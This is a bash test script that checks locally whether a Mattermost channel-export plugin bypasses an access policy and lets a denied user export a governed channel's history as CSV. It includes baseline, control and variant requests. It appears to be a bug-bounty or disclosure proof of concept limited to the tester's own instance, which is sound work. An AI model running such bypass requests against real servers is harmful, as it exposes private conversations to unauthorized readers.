#!/usr/bin/env bash
# S1 dynamic test — executes ../poc/S1-test-plan.md §3 in order against the
# LOCAL instance provisioned by this package. Own instance + own test
# accounts only (program rule). Never point BASE_URL at anyone else's server.
#
# Sequence:
#   3.1 baseline   B reads X via posts API (no policy yet) -> expect 200
#   --- PAUSE: apply ENFORCEMENT-CHECKLIST.md Part 2 (attribute + policy) ---
#   3.2 core deny  B posts API -> must be denied, else ABORT
#                  ("ENFORCEMENT INACTIVE — no conclusion")
#                  B /export via /commands/execute -> expect rejection
#   3.3 THE TEST   B plugin HTTP export of X
#                  200 + canary in CSV  => VULNERABLE
#                  403/404, no content  => fixed behaviour
#   3.4 controls   D export X (200+CSV) / E export X (404) /
#                  B export Y ungoverned (200+CSV) / B export Z archived (404)
#   3.5 variant    only if RUN_VARIANT=1 (manual prereqs in the checklist)
#
# Everything (status, headers, body, timestamps) is saved under
# results/<timestamp>/ with a summary.txt.
#
# Env: POLICY_ALREADY_APPLIED=1 skips the interactive pause.
set -euo pipefail

cd "$(dirname "$0")"

[ -f .env.test ] || { echo "ERROR: .env.test missing — run ./setup-actors.sh first" >&2; exit 1; }
# shellcheck disable=SC1091
. ./.env.test

API="$BASE_URL/api/v4"
PLUGIN_ID="com.mattermost.plugin-channel-export"
EXPORT_URL="$BASE_URL/plugins/$PLUGIN_ID/api/v1/export"

TS="$(date +%Y%m%d-%H%M%S)"
OUT="results/$TS"
mkdir -p "$OUT"
SUMMARY="$OUT/summary.txt"

log() { echo "$@" | tee -a "$SUMMARY"; }
stamp() { date -Is | tee -a "$SUMMARY" >/dev/null; }

# req <name> <token> <method> <url> [json-body]
# Saves $OUT/<name>.status/.headers/.body; echoes the HTTP status.
req() {
  local name="$1" token="$2" method="$3" url="$4" body="${5:-}" status
  if [ -n "$body" ]; then
    status="$(curl -s -o "$OUT/$name.body" -D "$OUT/$name.headers" -w '%{http_code}' \
      -X "$method" "$url" -H "Authorization: Bearer $token" \
      -H 'Content-Type: application/json' -d "$body")"
  else
    status="$(curl -s -o "$OUT/$name.body" -D "$OUT/$name.headers" -w '%{http_code}' \
      -X "$method" "$url" -H "Authorization: Bearer $token")"
  fi
  echo "$status" > "$OUT/$name.status"
  printf '%s' "$status"
}

has_canary() { grep -q "$CANARY" "$1"; }

log "=== S1 dynamic test — $TS ==="
log "Base URL: $BASE_URL"
log "Channel X (governed): $CHAN_X_ID / Y (ungoverned): $CHAN_Y_ID / Z (archived): $CHAN_Z_ID"
log "Canary: $CANARY"
stamp

# Environment evidence (test plan §4)
curl -s "$API/system/ping" > "$OUT/env-ping.json" || true
curl -s "$API/config/client" -H "Authorization: Bearer $A_TOKEN" > "$OUT/env-config-client.json" || true
curl -s "$API/license/client" -H "Authorization: Bearer $A_TOKEN" > "$OUT/env-license-client.json" || true
curl -s "$API/plugins" -H "Authorization: Bearer $A_TOKEN" > "$OUT/env-plugins.json" || true

# ---------------------------------------------------------------- 3.1 baseline
log ""
log "--- 3.1 Baseline (no policy): B reads X via posts API ---"
S="$(req 3.1-b-posts-baseline "$B_TOKEN" GET "$API/channels/$CHAN_X_ID/posts")"
log "GET /channels/X/posts as B -> HTTP $S (body: 3.1-b-posts-baseline.body)"
if [ "$S" != "200" ] || ! has_canary "$OUT/3.1-b-posts-baseline.body"; then
  log "BASELINE BROKEN: B cannot read X before any policy (HTTP $S, canary $(has_canary "$OUT/3.1-b-posts-baseline.body" && echo found || echo MISSING))."
  log "This is a setup problem (membership/posts), not a result. Fix setup and re-run."
  exit 1
fi
log "Baseline OK: B is a normal member with RBAC read; canary visible."

# ---------------------------------------------------------------- policy pause
if [ "${POLICY_ALREADY_APPLIED:-0}" != "1" ]; then
  cat <<'EOF'

===========================================================================
PAUSE — apply the access policy now (ENFORCEMENT-CHECKLIST.md Part 2):
  1. System Console -> System Attributes: attribute `clearance`
       B (s1b-attacker) = none ; D (s1d-control) = full
  2. ABAC permission policy governing `channel_read_access` for the member
     role on channel X (s1-governed), requiring clearance = full.
     Screenshot/record the exact policy construct for the evidence notes.
===========================================================================
Press Enter when the policy is applied (or Ctrl-C to stop)...
EOF
  read -r _
fi

# ---------------------------------------------------------------- 3.2 core denies B
log ""
log "--- 3.2 Policy applied: core must deny B ---"
S="$(req 3.2.1-b-posts-denied "$B_TOKEN" GET "$API/channels/$CHAN_X_ID/posts")"
log "GET /channels/X/posts as B -> HTTP $S (expected: denial, not 200)"
if [ "$S" = "200" ] && has_canary "$OUT/3.2.1-b-posts-denied.body"; then
  log ""
  log "ENFORCEMENT INACTIVE — no conclusion."
  log "B can still read X via the core API after the policy, so ABAC"
  log "enforcement is not engaged (license tier? ABAC off? flag off? policy"
  log "construct?). Per test plan §5: fix setup and re-run. NO plugin result"
  log "from this run may be interpreted."
  exit 2
fi
log "Core denial confirmed for the posts API."

S="$(req 3.2.2-b-command-execute "$B_TOKEN" POST "$API/commands/execute" \
  "{\"command\":\"/export\",\"channel_id\":\"$CHAN_X_ID\",\"team_id\":\"$TEAM_ID\"}")"
log "POST /commands/execute /export as B -> HTTP $S (expected: rejection; body in 3.2.2-b-command-execute.body)"
if [ "$S" = "200" ] || [ "$S" = "201" ]; then
  log "NOTE: execute returned $S — inspect the body: a trigger/response payload"
  log "      would mean the command path was NOT gated; an error payload is a denial."
fi

# ---------------------------------------------------------------- 3.3 the test
log ""
log "--- 3.3 Plugin HTTP export as B (the test) ---"
S="$(req 3.3-b-plugin-export "$B_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_X_ID&format=csv")"
log "GET /plugins/$PLUGIN_ID/api/v1/export?channel_id=X&format=csv as B -> HTTP $S"
if [ "$S" = "200" ] && has_canary "$OUT/3.3-b-plugin-export.body"; then
  log "RESULT [VULN]: HTTP 200 and the CSV contains C's canary post — B exported"
  log "        the full history of a channel core just denied B in 3.2."
  log "        (CSV header + canary row are in 3.3-b-plugin-export.body —"
  log "         redact everything else before sharing, per test plan §4.)"
  VERDICT="VULNERABLE"
elif [ "$S" = "403" ] || [ "$S" = "404" ]; then
  log "RESULT [NOT VULNERABLE on this build]: export denied with HTTP $S, consistent with core."
  VERDICT="FIXED"
else
  log "RESULT [INCONCLUSIVE]: HTTP $S; inspect 3.3-b-plugin-export.body manually."
  VERDICT="INCONCLUSIVE"
fi

# ---------------------------------------------------------------- 3.4 controls
log ""
log "--- 3.4 Controls ---"
S="$(req 3.4.1-d-plugin-export "$D_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_X_ID&format=csv")"
if [ "$S" = "200" ] && has_canary "$OUT/3.4.1-d-plugin-export.body"; then
  log "3.4.1 D (policy-satisfying member) export X -> HTTP $S + CSV [control OK]"
else
  log "3.4.1 D export X -> HTTP $S [CONTROL FAILED — legitimate reader blocked or canary missing; evidence is muddy]"
fi

S="$(req 3.4.2-e-plugin-export "$E_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_X_ID&format=csv")"
if [ "$S" = "404" ]; then
  log "3.4.2 E (non-member) export X -> HTTP $S [control OK: RBAC gate intact]"
else
  log "3.4.2 E export X -> HTTP $S [CONTROL FAILED — expected 404]"
fi

S="$(req 3.4.3-b-plugin-export-ungoverned "$B_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_Y_ID&format=csv")"
if [ "$S" = "200" ] && grep -q "$CANARY-Y" "$OUT/3.4.3-b-plugin-export-ungoverned.body"; then
  log "3.4.3 B export Y (no governing policy) -> HTTP $S + CSV [control OK: documented default]"
else
  log "3.4.3 B export Y -> HTTP $S [CONTROL FAILED — expected 200 + marker]"
fi

# Archive Z as A, then B tries to export it.
curl -s -X DELETE "$API/channels/$CHAN_Z_ID" -H "Authorization: Bearer $A_TOKEN" \
  > "$OUT/3.4.4-archive-z.body" || true
S="$(req 3.4.4-b-plugin-export-archived "$B_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_Z_ID&format=csv")"
if [ "$S" = "404" ]; then
  log "3.4.4 B export Z (archived) -> HTTP $S [control OK: existing archived check]"
else
  log "3.4.4 B export Z (archived) -> HTTP $S [CONTROL FAILED — expected 404]"
fi

# ---------------------------------------------------------------- 3.5 variant (optional)
if [ "${RUN_VARIANT:-0}" = "1" ]; then
  log ""
  log "--- 3.5 Variant: EnableAdminRestrictions=true + B as channel admin ---"
  log "Prereqs are manual (checklist): plugin setting ON, B channel admin of X,"
  log "policy still denying B. Re-checking core denial, then the export."
  S="$(req variant-b-posts-denied "$B_TOKEN" GET "$API/channels/$CHAN_X_ID/posts")"
  log "Variant: GET posts as B -> HTTP $S"
  S="$(req variant-b-plugin-export "$B_TOKEN" GET "$EXPORT_URL?channel_id=$CHAN_X_ID&format=csv")"
  if [ "$S" = "200" ] && has_canary "$OUT/variant-b-plugin-export.body"; then
    log "Variant RESULT: CSV still returned — config-mitigation rebuttal proven empirically."
  else
    log "Variant RESULT: export -> HTTP $S. If core exempts channel admins from the"
    log "policy on this version, record that and drop the variant (test plan §3.5)."
  fi
fi

log ""
log "=== VERDICT: $VERDICT ==="
log "Full evidence in $OUT/ (summary.txt, *.status, *.headers, *.body, env-*.json)"
echo
echo "Done. Results: $OUT/"
echo "Verdict: $VERDICT"
